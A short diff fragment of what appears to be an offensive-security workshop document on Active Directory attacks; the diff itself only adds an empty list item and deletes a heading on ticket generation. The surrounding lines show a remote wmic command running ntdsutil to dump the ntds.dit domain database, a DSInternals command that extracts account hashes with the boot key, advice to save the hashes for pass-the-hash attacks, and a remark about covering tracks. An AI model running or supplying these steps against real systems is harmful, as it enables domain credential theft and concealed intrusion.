@@ -75,9 +75,9 @@ wmic /node: /user: /password: process call create ntdsutil \"ac i ntds\" ifm \"c
 5. Use the DINTERNALS package to pull the hashes.
 `get-addbaccount -all -dbPath c:\ntds.dit -bootkey $key`
 6. Recommend dropping these into a file, and they can be used later for pass the hash attacks.
+7.
+
 
 
 > From here you sould properly cover your tracks, but that is a different workshop.
-
-## Total Not Mimikatz Ticket Generation
 
